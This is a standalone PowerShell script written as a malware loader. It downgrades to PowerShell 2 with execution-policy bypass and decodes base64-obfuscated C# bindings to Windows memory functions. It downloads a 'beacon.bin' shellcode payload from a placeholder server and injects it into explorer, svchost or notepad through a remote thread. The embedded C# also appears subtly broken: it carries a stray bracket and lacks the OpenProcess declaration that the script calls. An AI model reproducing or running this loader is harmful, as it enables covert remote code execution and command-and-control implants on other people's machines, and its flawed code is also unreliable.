if ($PSVersionTable.PSVersion.Major -gt 2) {
    powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass -File "$($MyInvocation.MyCommand.Path)"
    exit
}

$encodedCSharp = "W3VzaW5nIFN5c3RlbTsgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOyBwdWJsaWMgY2xhc3MgVXRpbCB7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXgoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbEFsbG9jYXRpb25UeXBlLCB1aW50IGZsUHJvdGVjdCk7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEJhc2VBZGRyZXNzLCBieXRlW10gbHBCdWZmZXIsIHVpbnQgblNpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7IFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7IH0="
$csharpCode = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedCSharp))
Add-Type $csharpCode

$shellcodeUrl = "https://your-server.com/beacon.bin"
$shellcode = (New-Object Net.WebClient).DownloadData($shellcodeUrl)

$target = Get-Process -Name explorer, svchost, notepad -ErrorAction SilentlyContinue | Select-Object -First 1
$hProcess = [Util]::OpenProcess(0x1F0FFF, $false, $target.Id)

$addr = [Util]::VirtualAllocEx($hProcess, 0, $shellcode.Length, 0x1000, 0x40)
[Util]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$null)
[Util]::CreateRemoteThread($hProcess, 0, 0, $addr, 0, 0, [ref]$null)
